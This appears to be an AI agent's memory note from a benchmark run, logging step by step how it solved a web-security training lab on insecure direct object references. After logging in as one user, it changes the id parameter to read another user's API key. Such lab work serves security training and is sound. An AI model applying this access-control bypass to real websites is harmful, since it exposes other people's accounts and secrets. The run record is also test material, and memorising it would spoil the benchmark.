---
metadata:
  node_type: memory
name: "PRS arm A baseline user-id-controlled-by-request-parameter"
description: "arm A 基线:lab-user-id-controlled-by-request-parameter 冷实例一次通过 - page_read→range_launch→登录→id=carlos 读 API key→submitSolution→banner solved"
last_updated: 2026-10-08T18:12:10+08:00
created: 2026-10-08T18:12:10+08:00
---

## 2026-10-08 arm A 基线 run — lab-user-id-controlled-by-request-parameter

- 目标:lab-user-id-controlled-by-request-parameter(IDOR/水平越权,横向提权到用户页)。
- 触发:冷会话,jar /tmp/cj1.json;全 HTTP 走件,零 shell 一行流。

### 步骤与证据
1. `page_read` lab 页 → widget-lab-id `CF2D0A74362EE20A8F6FFB1028E3B44FEE9AE125F418ED15832E4A8A2073BFF9`,`details_blocks_stripped:2`(题解未读,仅取 id/描述)。
2. `range_launch <sha256-id> --jar /tmp/cj1.json` → `reused:false`,实例 `0a090034039eb92084201eab009000b0.web-security-academy.net`(非复用,无需先 banner 判 solved)。
3. `http_session get /login` → csrf `3mM5Ib8pNV95pSw8pAPx5uegYBmrQ1GL`,banner 显示 Not solved(确认冷实例)。
4. `http_session post /login`(csrf+wiener:peter, --follow)→ 302 → `/my-account?id=wiener` 200,新 session 入 jar。
5. `http_session get /my-account?id=carlos` → 200,`Your username is: carlos`,`Your API Key is: IIjIJkr2XBu66pu9qRsHCilOeC5or9SE8`(id 参数未做授权绑定 = 漏洞命门)。
6. `http_session post /submitSolution` answer=key → `{"correct":true}`。
7. `banner_verdict` → `solved:true`,`<h4>Congratulations, you solved the lab!</h4>`。

### 结论
- 终态:solved,一次通过;题面所给 carlos 账号口令无需(仅凭 id 参数直取 API key)。
- 件链:page_read → range_launch → http_session(get/post) → banner_verdict 足够,无需 objref_scan。
- 纪要点:实例 `reused:false` 即冷态,可跳过先验 banner 分支;`/submitSolution` 的 answer 参数口径即 key 明文。

